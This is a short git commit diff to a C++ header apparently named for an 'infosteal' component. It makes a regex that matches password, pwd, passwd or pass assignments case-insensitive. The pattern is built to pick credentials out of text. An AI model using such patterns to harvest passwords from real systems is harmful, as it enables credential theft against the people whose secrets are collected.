6d0b1f74f1ec5c98ad4058e59e7c8a8d0d178eb7
Sgt Supergeil <maxrademacher02@gmail.com>
2021-01-19 17:29:42 +0100

    changed regex match to ignore case

--- src/conf/infosteal_patterns.h
+++ src/conf/infosteal_patterns.h
@@ -5,7 +5,7 @@ namespace conf {
 
 	const std::vector<ifs_pattern_entry> infosteal_patterns = {
 
-		ifs_pattern_entry("generic_password",std::regex("^.*(?:password|pwd|passwd|pass)=.*$"))
+		ifs_pattern_entry("generic_passwordfield",std::regex("^.*(?:password|pwd|passwd|pass)=.*$",std::regex_constants::icase)),
 
 	};
 }
